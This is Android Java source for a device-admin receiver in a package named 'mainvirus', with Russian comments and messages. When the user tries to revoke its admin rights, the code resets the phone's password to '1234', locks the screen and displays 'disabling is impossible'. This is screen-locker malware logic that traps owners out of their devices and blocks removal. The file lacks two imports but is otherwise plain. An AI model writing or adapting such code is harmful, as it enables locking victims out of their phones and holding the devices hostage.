package com.example.mainvirus;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {
        Toast.makeText(context, "Служба активирована", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // Если пользователь пытается отключить админку, снова блокируем экран
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(context, AdminReceiver.class);
        if (dpm.isAdminActive(admin)) {
            dpm.resetPassword("1234", 0);
            dpm.lockNow();
        }
        Toast.makeText(context, "Отключение невозможно", Toast.LENGTH_SHORT).show();
    }
}
